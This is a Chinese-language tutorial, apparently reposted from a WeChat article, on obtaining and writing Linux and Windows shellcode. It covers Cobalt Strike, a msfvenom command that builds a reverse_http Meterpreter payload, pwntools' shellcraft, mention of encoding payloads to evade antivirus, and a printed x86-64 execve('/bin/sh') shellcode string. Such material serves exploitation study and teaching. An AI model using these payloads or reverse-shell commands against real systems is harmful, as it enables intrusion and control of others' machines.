> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/_Mnzx-F1qZ-ApJM2eCdX1w)

![](https://mmbiz.qpic.cn/mmbiz_gif/5ZACCn1bWEwrm1niax0xWl6tFwyaPqCHRyskxXGvZQgOFTCFaUiaU6PSmdmwSdb3JEAuZwPx0lPWsHf2xuib8Asew/640?wx_fmt=gif)

0×00 shellcode 简介  

--------------------

在攻击中，shellcode 是一段用于利用软件漏洞的有效负载，shellcode 是 16 进制的机器码，以其经常让攻击者获得 shell 而得名。shellcode 常常使用机器语言编写。可在寄存器 eip 溢出后，放入一段可让 CPU 执行的 shellcode 机器码，让电脑可以执行攻击者的任意指令。

shellcode 可以按照攻击者控制是否在目标机器上执行载荷分为本地 shellcode 和远程 shellcode。本地运行的 shellcode 经常用于在攻击者对计算机的访问权限有限，需要利用软件漏洞提升权限；远程 shellcode 常用于攻击者以运行在某个网络中的另一台机器上的易受攻击的进程为目标时，如果成功执行，shellcode 可以通过网络访问目标主机。

那么，当我们已经通过种种手段得到程序溢出的地址，该如何获取或者编写 shellcode 呢，一起来看看吧。

0×01 直接获取 shellcode
-------------------

网络上有许多已经编写好的 shellcode 资源公开分享，由于 shellcode 的本质是一段机器码，在不同的硬件设备上可能有诸多区别，在使用时一定要注意平台是否通用。下面是两个可以学习的网站。

exploit database

![](https://mmbiz.qpic.cn/mmbiz_png/5ZACCn1bWExWrYrwgHz0rnFljo2rcWzwoFkq71QGicQ7yWb19BVVRGb8whl03b61QJCUrk2wCiasPrWfMfzyZiaJA/640?wx_fmt=png)

Shellcodes database for study cases（该平台目前已停止更新）

![](https://mmbiz.qpic.cn/mmbiz_png/5ZACCn1bWExWrYrwgHz0rnFljo2rcWzwR5u0An2VKEZe7z9xlicxbZb3mkDYFDOj5hEKRL7HQFgb1hkNts9pjKw/640?wx_fmt=png)

但来自网络的资源很有可能由于久久未更新、适用的系统已经被淘汰，或者是 shellcode 已经被公开而变得容易被查杀，这时候我们就需要能够即时获取 shellcode 的方法。

0×02 通过软件获取 shellcode
---------------------

目前网上有很多的开源的自动生成 shellcode 的工具，在这里介绍两种比较常用的 shellcode 生成方式。

### 1.cobaltstrike（版本 4.0）

![](https://mmbiz.qpic.cn/mmbiz_png/5ZACCn1bWExWrYrwgHz0rnFljo2rcWzwWic0lHJpRMJVmC5dRrZkZZrfam5637ibicWEzq55lf9jC9SvF28WjWZFw/640?wx_fmt=png)

勾选生成 c 语言形式的 shellcode，在下拉列表里我们还能看到有许多其他语言形式的 shellcode。

![](https://mmbiz.qpic.cn/mmbiz_png/5ZACCn1bWExWrYrwgHz0rnFljo2rcWzwWiaw12Qtib21FMJEcIDVpA49fZsQLjibEQj2Mx3PcicVElDUM5A0gGvy6g/640?wx_fmt=png)

接着我们会得到一个文件，其中包含了所需的 shellcode，只要将这段 shellcode 放入预先写好的加载器中就可以使用了：

![](https://mmbiz.qpic.cn/mmbiz_png/5ZACCn1bWExWrYrwgHz0rnFljo2rcWzw5NkXDzibmicrlb6lxhBVe3U12jGr1ZSQcYKaVx8F9ScI6icuhIbph68Qg/640?wx_fmt=png)

### 2.msf（系统版本 kali linux 5.5 amd64）

在 linux 平台下，我们还可以利用 metasploit 框架下的 msfvenom 生成 shellcode

命令行选项：

```
  -p, --payload    <payload>       指定需要使用的payload(攻击载荷)。如果需要使用自定义的payload，请使用'-'或者stdin指定
        -l, --list       [module_type]   列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all
        -n, --nopsled    <length>        为payload预先指定一个NOP滑动长度
        -f, --format     <format>        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)
        -e, --encoder    [encoder]       指定需要使用的encoder（编码器）
        -a, --arch       <architecture>  指定payload的目标架构
            --platform   <platform>      指定payload的目标平台
        -s, --space      <length>        设定有效攻击荷载的最大长度
        -b, --bad-chars  <list>          设定规避字符集，比如:\x00\xff
        -i, --iterations <count>         指定payload的编码次数
        -c, --add-code   <path>          指定一个附加的win32 shellcode文件
        -x, --template   <path>          指定一个自定义的可执行文件作为模板
        -k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行
            --payload-options            列举payload的标准选项
        -o, --out   <path>               保存payload
        -v, --var-name <name>            指定一个自定义的变量，以确定输出格式
            --shellest                   最小化生成payload
        -h, --help                       查看帮助选项
            --help-formats               查看msf支持的输出格式列表

```

例如：

```
msfvenom -p windows/meterpreter/reverse_http lhost=192.168.1.101 lport=4444 -f c

```

这个指令生成的 shellcode 将会注入 mettle server payload 反弹连接一个连接

接着我们会得到相应的 shellcode。

![](https://mmbiz.qpic.cn/mmbiz_png/5ZACCn1bWExWrYrwgHz0rnFljo2rcWzwjicXkNdGoMsk5tRHuK2HGEXicvj1YwicfmDPRVnDy8tiboDJiaJHYuProSA/640?wx_fmt=png)

当然这只是最基础的操作，msfvenom 集成了 msfpayload 和 msfencoder，还可以添加其他的指令，通过编码和迭代来避免杀毒软件的查杀。

### 3.pwntools(python 3.8）

pwntools 是常用的二进制利用框架。下图官方文档中是 pwntools 中生成 shellcode 的核心模块 shellcraft 及相应用法。

![](https://mmbiz.qpic.cn/mmbiz_png/5ZACCn1bWExWrYrwgHz0rnFljo2rcWzwiaFiaLCEW5z1Ld5AdeUyibXnWdocP6vlt2VicCXYZACib6YUEJiaXft0BnHA/640?wx_fmt=png)

例如：

```
from pwn import *

#设置目标机器信息

context(arch = 'amd64', os = 'linux',log_level = 'debug')

#asm()将接受到的字符串转变为汇编码的机器代码,而shellcraft可以生成asm下的shellcode

shellcode=asm(shellcraft.amd64.linux.sh())

print(shellcode)

```

运行代码，可以得到汇编代码及对应的 shellcode：

0×03 编写 shellcode
-----------------

但假如我们需要一些具有特殊功能的 shellcode，软件却无法提供相应功能时，该如何方便快捷的编写 shellcode 呢？

### 1. 直接通过机器码写 shellcode

难度对于一般程序员过大，且容易出错

### 2. 通过汇编语言写 shellcode

在这里我们以 linux 平台为例。

理想效果的 c 代码：

```
#include "stdlib.h"

    #include "stdlib.h"#include "unistd.h"char *buf[]={"/bin/sh",NULL};void main(){    execve("/bin/sh",buf,NULL);    exit(0);}

```

execve()用来执行参数 filename 字符串所代表的文件路径，第二个参数是利用指针数组来传递给执行文件的参数，并且需要以空指针 (NULL) 结束，最后一个参数则为传递给执行文件的新环境变量数组。  

查询 64 位 linux 中断向量表可知，64 位 linux 下，execve() 对应的中断向量表为：0x3b，对应 rax

![](https://mmbiz.qpic.cn/mmbiz_png/5ZACCn1bWExWrYrwgHz0rnFljo2rcWzwRlznYABEUn4xZC87S9Go3BaB7VVkaxlNwnovhvOe9sMUiabSwsX4NTQ/640?wx_fmt=png)

编译文件：

```
nasm -f elf64 sc64.asm 

nasm -f elf64 sc64.asm ld -m elf_x86_64 -s -o shellcode sc64.o ./shellcode

```

成功运行文件，达到了预期效果，说明编写无误：

![](https://mmbiz.qpic.cn/mmbiz_png/5ZACCn1bWExWrYrwgHz0rnFljo2rcWzwLDXZbIVnulnv8NAjiaFdRTrBjGcQqCU59T5mCS7icgTYsKNuzYaAjIuA/640?wx_fmt=png)

此时可以查看机器码：

![](https://mmbiz.qpic.cn/mmbiz_png/5ZACCn1bWExWrYrwgHz0rnFljo2rcWzwhjfVCPicZeFOtq88qcWaciaSlSUwMGSu0r1YrIiaK5Lvxj40qQn0WwicJQ/640?wx_fmt=png)

虽然已经给出机器码，但如果我们能通过过滤无关参数直接获取 shellcode，何乐而不为呢？运行命令：

```
objdump -d ./shellcode|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

```

得到 shellcode:

```
\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05

```

![](https://mmbiz.qpic.cn/mmbiz_gif/5ZACCn1bWEyV1xvApsBJHLOxfIxbKOCyf6pSwHic8ictKFddxRKaGA4gpWeNvNwzVibUiaJBInYFXJTNGlOoYsHWPg/640?wx_fmt=gif)